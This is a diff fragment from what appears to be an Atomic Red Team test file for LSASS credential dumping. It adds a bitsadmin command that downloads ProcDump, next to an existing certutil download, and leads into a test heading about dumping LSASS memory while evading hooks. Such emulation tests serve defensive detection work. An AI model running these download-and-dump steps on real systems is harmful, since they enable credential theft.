@@ -5,6 +5,7 @@ T1003.001.md
 certutil -urlcache -split -f "https://download.sysinternals.com/files/Procdump.zip" "PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip"
 if not exist "PathToAtomicsFolder\..\ExternalPayloads" mkdir "PathToAtomicsFolder\..\ExternalPayloads"
 expand "PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip" "PathToAtomicsFolder\..\ExternalPayloads\Procdump" -F:*
+bitsadmin /transfer myDownloadJob /download /priority normal "https://download.sysinternals.com/files/Procdump.zip" "PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip"
 
 
 ## Atomic Test #3 - Dump LSASS.exe Memory using direct system calls and API unhooking
